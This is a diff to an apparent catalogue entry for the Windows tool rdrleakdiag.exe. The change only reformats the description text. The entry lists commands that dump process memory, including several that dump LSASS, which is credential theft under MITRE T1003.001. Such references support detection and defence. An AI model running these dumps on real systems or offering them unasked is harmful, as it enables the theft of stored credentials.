@@ -5,21 +5,21 @@ Author: 'John Dwyer'
 Created: 2022-05-18
 Commands:
   - Command: rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
-    Description: Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Description: Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
     Usecase: Dump process by PID.
     Category: Dump
     Privileges: User
     MitreID: T1003
     OperatingSystem: Windows
   - Command: rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
-    Description: Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Description: Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
     Usecase: Dump LSASS process.
     Category: Dump
     Privileges: Administrator
     MitreID: T1003.001
     OperatingSystem: Windows
   - Command: rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap
-    Description: After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Description: After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
     Usecase: Dump LSASS process mutliple times.
     Category: Dump
     Privileges: Administrator
